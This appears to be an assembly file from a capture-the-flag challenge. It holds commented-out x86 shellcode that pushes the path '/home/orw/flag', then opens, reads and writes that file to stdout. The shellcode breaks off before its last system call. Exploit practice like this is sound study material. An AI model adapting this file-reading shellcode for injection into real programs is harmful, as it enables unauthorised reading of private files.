#include <sys/syscall.h>

.global main
.type   main, @function

main:

#  push $5
#  pop %eax
#  push $0x6761	
#  push $0x6c662f77
#  push $0x726f2f65
#  push $0x6d6f682f
#  xor %ecx, %ecx
#  cltd
#  push %esp
#  pop %ebx
#  int $0x80
#  push $3
#  pop %eax
#  push $3
#  pop %ebx
#  push $0x804a500
#  pop %ecx
#  push $50
#  pop %edx
#  int $0x80
#  push $4
#  pop %eax
#  push $1
#  pop %ebx
#  push $0x804a500
#  pop %ecx
#  push $50

  call 0x08048548 
